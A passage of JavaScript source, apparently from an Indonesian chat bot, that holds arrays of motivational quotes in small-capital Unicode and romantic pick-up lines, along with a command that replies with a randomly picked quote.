"ʙᴇᴋᴇʀᴊᴀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ᴛɪᴅᴜʀ. ʙᴇʟᴀᴊᴀʀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ʙᴇʀᴘᴇꜱᴛᴀ. ʜᴇᴍᴀᴛ ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴɢʜᴀʙɪꜱᴋᴀɴ. ʜɪᴅᴜᴘʟᴀʜ ꜱᴇᴘᴇʀᴛɪ ᴍɪᴍᴘɪ ᴍᴇʀᴇᴋᴀ.",
"ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴜꜱᴀᴛᴋᴀɴ ᴘɪᴋɪʀᴀɴ ꜱᴀᴅᴀʀ ᴋɪᴛᴀ ᴘᴀᴅᴀ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ɪɴɢɪɴᴋᴀɴ, ʙᴜᴋᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ᴛᴀᴋᴜᴛɪ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ɢᴀɢᴀʟ. ᴋᴇᴛᴀᴋᴜᴛᴀɴ ʙᴇʀᴀᴅᴀ ᴅɪ ᴛᴇᴍᴘᴀᴛ ʏᴀɴɢ ꜱᴀᴍᴀ ᴛᴀʜᴜɴ ᴅᴇᴘᴀɴ ꜱᴇᴘᴇʀᴛɪ ᴀɴᴅᴀ ꜱᴀᴀᴛ ɪɴɪ.",
"ᴊɪᴋᴀ ᴋɪᴛᴀ ᴛᴇʀᴜꜱ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ʟᴀᴋᴜᴋᴀɴ, ᴋɪᴛᴀ ᴀᴋᴀɴ ᴛᴇʀᴜꜱ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴊɪᴋᴀ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱᴛʀᴇꜱ, ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴍᴇɴɢᴇʟᴏʟᴀ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ.",
"ʙᴇʀꜱɪᴋᴀᴘ ᴋᴇʀᴀꜱ ᴋᴇᴘᴀʟᴀ ᴛᴇɴᴛᴀɴɢ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴅᴀɴ ꜰʟᴇᴋꜱɪʙᴇʟ ᴛᴇɴᴛᴀɴɢ ᴍᴇᴛᴏᴅᴇ ᴀɴᴅᴀ.",
"ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ᴍᴇɴɢᴀʟᴀʜᴋᴀɴ ʙᴀᴋᴀᴛ ᴋᴇᴛɪᴋᴀ ʙᴀᴋᴀᴛ ᴛɪᴅᴀᴋ ʙᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ.",
"ɪɴɢᴀᴛʟᴀʜ ʙᴀʜᴡᴀ ᴘᴇʟᴀᴊᴀʀᴀɴ ᴛᴇʀʙᴇꜱᴀʀ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ʙɪᴀꜱᴀɴʏᴀ ᴅɪᴘᴇʟᴀᴊᴀʀɪ ᴅᴀʀɪ ꜱᴀᴀᴛ-ꜱᴀᴀᴛ ᴛᴇʀʙᴜʀᴜᴋ ᴅᴀɴ ᴅᴀʀɪ ᴋᴇꜱᴀʟᴀʜᴀɴ ᴛᴇʀʙᴜʀᴜᴋ.",
"ʜɪᴅᴜᴘ ʙᴜᴋᴀɴ ᴛᴇɴᴛᴀɴɢ ᴍᴇɴᴜɴɢɢᴜ ʙᴀᴅᴀɪ ʙᴇʀʟᴀʟᴜ, ᴛᴇᴛᴀᴘɪ ʙᴇʟᴀᴊᴀʀ ᴍᴇɴᴀʀɪ ᴅɪ ᴛᴇɴɢᴀʜ ʜᴜᴊᴀɴ.",
"ᴊɪᴋᴀ ʀᴇɴᴄᴀɴᴀɴʏᴀ ᴛɪᴅᴀᴋ ʙᴇʀʜᴀꜱɪʟ, ᴜʙᴀʜ ʀᴇɴᴄᴀɴᴀɴʏᴀ ʙᴜᴋᴀɴ ᴛᴜᴊᴜᴀɴɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴀᴋᴀɴ ʙᴇʀᴀᴋʜɪʀ; ᴛᴀᴋᴜᴛʟᴀʜ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴛᴀᴋ ᴘᴇʀɴᴀʜ ᴅɪᴍᴜʟᴀɪ.",
"ᴏʀᴀɴɢ ʏᴀɴɢ ʙᴇɴᴀʀ-ʙᴇɴᴀʀ ʜᴇʙᴀᴛ ᴀᴅᴀʟᴀʜ ᴏʀᴀɴɢ ʏᴀɴɢ ᴍᴇᴍʙᴜᴀᴛ ꜱᴇᴛɪᴀᴘ ᴏʀᴀɴɢ ᴍᴇʀᴀꜱᴀ ʜᴇʙᴀᴛ.",
"ᴘᴇɴɢᴀʟᴀᴍᴀɴ ᴀᴅᴀʟᴀʜ ɢᴜʀᴜ ʏᴀɴɢ ʙᴇʀᴀᴛ ᴋᴀʀᴇɴᴀ ᴅɪᴀ ᴍᴇᴍʙᴇʀɪᴋᴀɴ ᴛᴇꜱ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ, ᴋᴇᴍᴜᴅɪᴀɴ ᴘᴇʟᴀᴊᴀʀᴀɴɴʏᴀ.",
"ᴍᴇɴɢᴇᴛᴀʜᴜɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴀɴʏᴀᴋ ʏᴀɴɢ ᴘᴇʀʟᴜ ᴅɪᴋᴇᴛᴀʜᴜɪ ᴀᴅᴀʟᴀʜ ᴀᴡᴀʟ ᴅᴀʀɪ ʙᴇʟᴀᴊᴀʀ ᴜɴᴛᴜᴋ ʜɪᴅᴜᴘ.",
"ꜱᴜᴋꜱᴇꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴋʜɪʀ, ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ꜰᴀᴛᴀʟ. ʏᴀɴɢ ᴛᴇʀᴘᴇɴᴛɪɴɢ ᴀᴅᴀʟᴀʜ ᴋᴇʙᴇʀᴀɴɪᴀɴ ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ.",
"ʟᴇʙɪʜ ʙᴀɪᴋ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ᴏʀɪꜱɪɴᴀʟɪᴛᴀꜱ ᴅᴀʀɪᴘᴀᴅᴀ ʙᴇʀʜᴀꜱɪʟ ᴍᴇɴɪʀᴜ.",
"ʙᴇʀᴀɴɪ ʙᴇʀᴍɪᴍᴘɪ, ᴛᴀᴘɪ ʏᴀɴɢ ʟᴇʙɪʜ ᴘᴇɴᴛɪɴɢ, ʙᴇʀᴀɴɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴛɪɴᴅᴀᴋᴀɴ ᴅɪ ʙᴀʟɪᴋ ɪᴍᴘɪᴀɴᴍᴜ.",
"ᴛᴇᴛᴀᴘᴋᴀɴ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴛɪɴɢɢɪ-ᴛɪɴɢɢɪ, ᴅᴀɴ ᴊᴀɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ᴍᴇɴᴄᴀᴘᴀɪɴʏᴀ.",
"ᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀʀɪ ᴋᴇɢᴀɢᴀʟᴀɴ. ᴋᴇᴘᴜᴛᴜꜱᴀꜱᴀᴀɴ ᴅᴀɴ ᴋᴇɢᴀɢᴀʟᴀɴ ᴀᴅᴀʟᴀʜ ᴅᴜᴀ ʙᴀᴛᴜ ʟᴏɴᴄᴀᴛᴀɴ ᴘᴀʟɪɴɢ ᴘᴀꜱᴛɪ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ.",
"ᴊᴇɴɪᴜꜱ ᴀᴅᴀʟᴀʜ ꜱᴀᴛᴜ ᴘᴇʀꜱᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ ᴅᴀɴ ꜱᴇᴍʙɪʟᴀɴ ᴘᴜʟᴜʜ ꜱᴇᴍʙɪʟᴀɴ ᴘᴇʀꜱᴇɴ ᴋᴇʀɪɴɢᴀᴛ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴛᴇᴍᴘᴀᴛ ᴘᴇʀꜱɪᴀᴘᴀɴ ᴅᴀɴ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ʙᴇʀᴛᴇᴍᴜ.",
"ᴋᴇᴛᴇᴋᴜɴᴀɴ ɢᴀɢᴀʟ 19 ᴋᴀʟɪ ᴅᴀɴ ʙᴇʀʜᴀꜱɪʟ ᴘᴀᴅᴀ ᴋᴇꜱᴇᴍᴘᴀᴛᴀᴍ ʏᴀɴɢ ᴋᴇ-20.",
"ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ ᴅᴀɴ ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ᴋᴇɢᴀɢᴀʟᴀɴ ʜᴀᴍᴘɪʀ ᴘᴇʀꜱɪꜱ ꜱᴀᴍᴀ.",
"ꜱᴜᴋꜱᴇꜱ ʙɪᴀꜱᴀɴʏᴀ ᴅᴀᴛᴀɴɢ ᴋᴇᴘᴀᴅᴀ ᴍᴇʀᴇᴋᴀ ʏᴀɴɢ ᴛᴇʀʟᴀʟᴜ ꜱɪʙᴜᴋ ᴍᴇɴᴄᴀʀɪɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴜɴᴅᴀ ᴘᴇᴋᴇʀᴊᴀᴀɴᴍᴜ ꜱᴀᴍᴘᴀɪ ʙᴇꜱᴏᴋ, ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇɴɢᴇʀᴊᴀᴋᴀɴɴʏᴀ ʜᴀʀɪ ɪɴɪ.",
"20 ᴛᴀʜᴜɴ ᴅᴀʀɪ ꜱᴇᴋᴀʀᴀɴɢ, ᴋᴀᴜ ᴍᴜɴɢᴋɪɴ ʟᴇʙɪʜ ᴋᴇᴄᴇᴡᴀ ᴅᴇɴɢᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴛɪᴅᴀᴋ ꜱᴇᴍᴘᴀᴛ ᴋᴀᴜ ʟᴀᴋᴜᴋᴀɴ ᴀʟɪʜ-ᴀʟɪʜ ʏᴀɴɢ ꜱᴜᴅᴀʜ.",
"ᴊᴀɴɢᴀɴ ʜᴀʙɪꜱᴋᴀɴ ᴡᴀᴋᴛᴜᴍᴜ ᴍᴇᴍᴜᴋᴜʟɪ ᴛᴇᴍʙᴏᴋ ᴅᴀɴ ʙᴇʀʜᴀʀᴀᴘ ʙɪꜱᴀ ᴍᴇɴɢᴜʙᴀʜɴʏᴀ ᴍᴇɴᴊᴀᴅɪ ᴘɪɴᴛᴜ.",
"ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ɪᴛᴜ ᴍɪʀɪᴘ ꜱᴇᴘᴇʀᴛɪ ᴍᴀᴛᴀʜᴀʀɪ ᴛᴇʀʙɪᴛ. ᴋᴀʟᴀᴜ ᴋᴀᴜ ᴍᴇɴᴜɴɢɢᴜ ᴛᴇʀʟᴀʟᴜ ʟᴀᴍᴀ, ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇʟᴇᴡᴀᴛᴋᴀɴɴʏᴀ.",
"ʜɪᴅᴜᴘ ɪɴɪ ᴛᴇʀᴅɪʀɪ ᴅᴀʀɪ 10 ᴘᴇʀꜱᴇɴ ᴀᴘᴀ ʏᴀɴɢ ᴛᴇʀᴊᴀᴅɪ ᴘᴀᴅᴀᴍᴜ ᴅᴀɴ 90 ᴘᴇʀꜱᴇɴ ʙᴀɢᴀɪᴍᴀɴᴀ ᴄᴀʀᴀᴍᴜ ᴍᴇɴʏɪᴋᴀᴘɪɴʏᴀ.",
"ᴀᴅᴀ ᴛɪɢᴀ ᴄᴀʀᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀᴘᴀɪ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴛᴇʀᴛɪɴɢɢɪ: ᴄᴀʀᴀ ᴘᴇʀᴛᴀᴍᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴅᴜᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴛɪɢᴀ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴊᴀᴅɪ ʙᴀɪᴋ.",
"ᴀʟᴀꜱᴀɴ ɴᴏᴍᴏʀ ꜱᴀᴛᴜ ᴏʀᴀɴɢ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ᴀᴅᴀʟᴀʜ ᴋᴀʀᴇɴᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴᴅᴇɴɢᴀʀᴋᴀɴ ᴛᴇᴍᴀɴ, ᴋᴇʟᴜᴀʀɢᴀ, ᴅᴀɴ ᴛᴇᴛᴀɴɢɢᴀ ᴍᴇʀᴇᴋᴀ.",
"ᴡᴀᴋᴛᴜ ʟᴇʙɪʜ ʙᴇʀʜᴀʀɢᴀ ᴅᴀʀɪᴘᴀᴅᴀ ᴜᴀɴɢ. ᴋᴀᴍᴜ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴜᴀɴɢ, ᴛᴇᴛᴀᴘɪ ᴋᴀᴍᴜ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴡᴀᴋᴛᴜ.",
"ᴘᴇɴᴇᴛᴀᴘᴀɴ ᴛᴜᴊᴜᴀɴ ᴀᴅᴀʟᴀʜ ʀᴀʜᴀꜱɪᴀ ᴍᴀꜱᴀ ᴅᴇᴘᴀɴ ʏᴀɴɢ ᴍᴇɴᴀʀɪᴋ.",
"ꜱᴀᴀᴛ ᴋɪᴛᴀ ʙᴇʀᴜꜱᴀʜᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ ᴅᴀʀɪ ᴋɪᴛᴀ, ꜱᴇɢᴀʟᴀ ꜱᴇꜱᴜᴀᴛᴜ ᴅɪ ꜱᴇᴋɪᴛᴀʀ ᴋɪᴛᴀ ᴊᴜɢᴀ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ.",
"ᴘᴇʀᴛᴜᴍʙᴜʜᴀɴ ᴅɪᴍᴜʟᴀɪ ᴋᴇᴛɪᴋᴀ ᴋɪᴛᴀ ᴍᴜʟᴀɪ ᴍᴇɴᴇʀɪᴍᴀ ᴋᴇʟᴇᴍᴀʜᴀɴ ᴋɪᴛᴀ ꜱᴇɴᴅɪʀɪ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ʜᴀʟ ᴘᴇʀᴛᴀᴍᴀ ʏᴀɴɢ ᴅɪʟᴀᴋᴜᴋᴀɴ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴀɴᴅᴀɴɢ ᴋᴇɢᴀɢᴀʟᴀɴ ꜱᴇʙᴀɢᴀɪ ꜱɪɴʏᴀʟ ᴘᴏꜱɪᴛɪꜰ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ.",
"ᴄɪʀɪ ᴋʜᴀꜱ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇʀᴇᴋᴀ ꜱᴇʟᴀʟᴜ ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴜɴᴛᴜᴋ ᴍᴇᴍᴘᴇʟᴀᴊᴀʀɪ ʜᴀʟ-ʜᴀʟ ʙᴀʀᴜ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ɪɴɢɪɴᴋᴀɴ, ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴍᴇɴɢɪɴɢɪɴᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴏʀᴀɴɢ ᴘᴇꜱɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴋᴇꜱᴜʟɪᴛᴀɴ ᴅɪ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ. ᴏʀᴀɴɢ ʏᴀɴɢ ᴏᴘᴛɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴘᴇʟᴜᴀɴɢ ᴅᴀʟᴀᴍ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴜʟɪᴛᴀɴ.",
"ᴋᴇʀᴀɢᴜᴀɴ ᴍᴇᴍʙᴜɴᴜʜ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴍɪᴍᴘɪ ᴅᴀʀɪᴘᴀᴅᴀ ᴋᴇɢᴀɢᴀʟᴀɴ.",
"ʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ʜᴀʀᴜꜱ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ ꜱᴀᴍᴘᴀɪ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ɪɴɢɪɴ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ.",
"ᴏᴘᴛɪᴍɪꜱᴛɪꜱ ᴀᴅᴀʟᴀʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴋᴜᴀʟɪᴛᴀꜱ ʏᴀɴɢ ʟᴇʙɪʜ ᴛᴇʀᴋᴀɪᴛ ᴅᴇɴɢᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀɴ ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴅᴀʀɪᴘᴀᴅᴀ ʏᴀɴɢ ʟᴀɪɴ.",
"ᴘᴇɴɢʜᴀʀɢᴀᴀɴ ᴘᴀʟɪɴɢ ᴛɪɴɢɢɪ ʙᴀɢɪ ꜱᴇᴏʀᴀɴɢ ᴘᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴘᴀ ʏᴀɴɢ ᴅɪᴀ ᴘᴇʀᴏʟᴇʜ ᴅᴀʀɪ ᴘᴇᴋᴇʀᴊᴀᴀɴ ɪᴛᴜ, ᴛᴀᴘɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴇʀᴋᴇᴍʙᴀɴɢ ɪᴀ ᴅᴇɴɢᴀɴ ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱɴʏᴀ ɪᴛᴜ.",
"ᴄᴀʀᴀ ᴛᴇʀʙᴀɪᴋ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴀᴅᴀʟᴀʜ ᴅᴇɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ʙᴇʀʙɪᴄᴀʀᴀ ᴅᴀɴ ᴍᴜʟᴀɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ.",
"ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴜꜱᴜʟ ᴊɪᴋᴀ ᴛᴇᴋᴀᴅ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ ᴄᴜᴋᴜᴘ ᴋᴜᴀᴛ."
]
let motivasii = pickRandom(motivasi)
    reply(`"${motivasii}"`)
}
break
case 'quotesbucin': {
const bucin = [
    "Aku memilih untuk sendiri, bukan karena menunggu yang sempurna, tetapi butuh yang tak pernah menyerah.",
    "Seorang yang single diciptakan bersama pasangan yang belum ditemukannya.",
    "Jomblo. Mungkin itu cara Tuhan untuk mengatakan 'Istirahatlah dari cinta yang salah'.",
    "Jomblo adalah anak muda yang mendahulukan pengembangan pribadinya untuk cinta yang lebih berkelas nantinya.",
    "Aku bukan mencari seseorang yang sempurna, tapi aku mencari orang yang menjadi sempurna berkat kelebihanku.",
    "Pacar orang adalah jodoh kita yang tertunda.",
    "Jomblo pasti berlalu. Semua ada saatnya, saat semua kesendirian menjadi sebuah kebersamaan dengannya kekasih halal. Bersabarlah.",
    "Romeo rela mati untuk juliet, Jack mati karena menyelamatkan Rose. Intinya, kalau tetap mau hidup, jadilah single.",
    "Aku mencari orang bukan dari kelebihannya tapi aku mencari orang dari ketulusan hatinya.",
    "Jodoh bukan sendal jepit, yang kerap tertukar. Jadi teruslah berada dalam perjuangan yang semestinya.",
    "Kalau kamu jadi senar gitar, aku nggak mau jadi gitarisnya. Karena aku nggak mau mutusin kamu.",
    "Bila mencintaimu adalah ilusi, maka izinkan aku berimajinasi selamanya.",
    "Sayang... Tugas aku hanya mencintaimu, bukan melawan takdir.",
    "Saat aku sedang bersamamu rasanya 1 jam hanya 1 detik, tetapi jika aku jauh darimu rasanya 1 hari menjadi 1 tahun.",
    "Kolak pisang tahu sumedang, walau jarak membentang cintaku takkan pernah hilang.",
    "Aku ingin menjadi satu-satunya, bukan salah satunya.",
    "Aku tidak bisa berjanji untuk menjadi yang baik. Tapi aku berjanji akan selalu mendampingi kamu.",
    "Kalau aku jadi wakil rakyat aku pasti gagal, gimana mau mikirin rakyat kalau yang selalu ada dipikiran aku hanyalah dirimu.",
    "Lihat kebunku, penuh dengan bunga. Lihat matamu, hatiku berbunga-bunga.",
    "Berjanjilah untuk terus bersamaku sekarang, esok, dan selamanya.",
    "Rindu tidak hanya muncul karena jarak yang terpisah. Tapi juga karena keinginan yang tidak terwujud.",
    "Kamu tidak akan pernah jauh dariku, kemanapun aku pergi kamu selalu ada, karena kamu selalu di hatiku, yang jauh hanya raga kita bukan hati kita.",
    "Aku tahu dalam setiap tatapanku, kita terhalang oleh jarak dan waktu. Tapi aku yakin kalau nanti kita pasti bisa bersatu.",
    "Merindukanmu tanpa pernah bertemu sama halnya dengan menciptakan lagu yang tak pernah ternyayikan.",
    "Ada kalanya jarak selalu menjadi penghalang antara aku sama kamu, namun tetap saja di hatiku kita selalu dekat.",
    "Jika hati ini tak mampu membendung segala kerinduan, apa daya tak ada yang bisa aku lakukan selain mendoakanmu.",
    "Mungkin di saat ini aku hanya bisa menahan kerinduan ini. Sampai tiba saatnya nanti aku bisa bertemu dan melepaskan kerinduan ini bersamamu.",
    "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
    "Dalam dinginnya malam, tak kuingat lagi; Berapa sering aku memikirkanmu juga merindukanmu.",
    "Merindukanmu itu seperti hujan yang datang tiba-tiba dan bertahan lama. Dan bahkan setelah hujan reda, rinduku masih terasa.",
    "Sejak mengenalmu bawaannya aku pengen belajar terus, belajar menjadi yang terbaik buat kamu.",
    "Tahu gak perbedaan pensi sama wajah kamu? Kalau pensil tulisannya bisa dihapus, tapi kalau wajah kamu gak akan ada yang bisa hapus dari pikiran aku.",
    "Bukan Ujian Nasional besok yang harus aku khawatirkan, tapi ujian hidup yang aku lalui setelah kamu meninggalkanku.",
    "Satu hal kebahagiaan di sekolah yang terus membuatku semangat adalah bisa melihat senyumanmu setiap hari.",
    "Kamu tahu gak perbedaanya kalau ke sekolah sama ke rumah kamu? Kalo ke sekolah pasti yang di bawa itu buku dan pulpen, tapi kalo ke rumah kamu, aku cukup membawa hati dan cinta.",
    "Aku gak sedih kok kalo besok hari senin, aku sedihnya kalau gak ketemu kamu.",
    "Momen cintaku tegak lurus dengan momen cintamu. Menjadikan cinta kita sebagai titik ekuilibrium yang sempurna.",
    "Aku rela ikut lomba lari keliling dunia, asalkan engkai yang menjadi garis finishnya.",
    "PR-ku adalah merindukanmu. Lebih kuat dari Matematika, lebih luas dari Fisika, lebih kerasa dari Biologi.",
    "Cintaku kepadamu itu bagaikan metabolisme, yang gak akan berhenti sampai mati.",
    "Kalau jelangkungnya kaya kamu, dateng aku jemput, pulang aku anter deh.",
    "Makan apapun aku suka asal sama kamu, termasuk makan ati.",
    "Cinta itu kaya hukuman mati. Kalau nggak ditembak, ya digantung.",
    "Mencintaimu itu kayak narkoba: sekali coba jadi candu, gak dicoba bikin penasaran, ditinggalin bikin sakaw.",
    "Gue paling suka ngemil karena ngemil itu enak. Apalagi ngemilikin kamu sepenuhnya...",
    "Dunia ini cuma milik kita berdua. Yang lainnya cuma ngontrak.",
    "Bagi aku, semua hari itu adalah hari Selasa. Selasa di Surga bila dekat denganmu...",
    "Bagaimana kalau kita berdua jadi komplotan penjahat? Aku curi hatimu dan kamu curi hatiku.",
    "Kamu itu seperti kopi yang aku seruput pagi ini. Pahit, tapi bikin nagih.",
    "Aku sering cemburu sama lipstikmu. Dia bisa nyium kamu tiap hari, dari pagi sampai malam.",
    "Hanya mendengar namamu saja sudah bisa membuatku tersenyum seperti orang bodoh.",
    "Aku tau teman wanitamu bukan hanya satu, dan menyukaimu pun bukan hanya aku.",
    "Semenjak aku berhenti berharap pada dirimu, aku jadi tidak semangat dalam segala hal..",
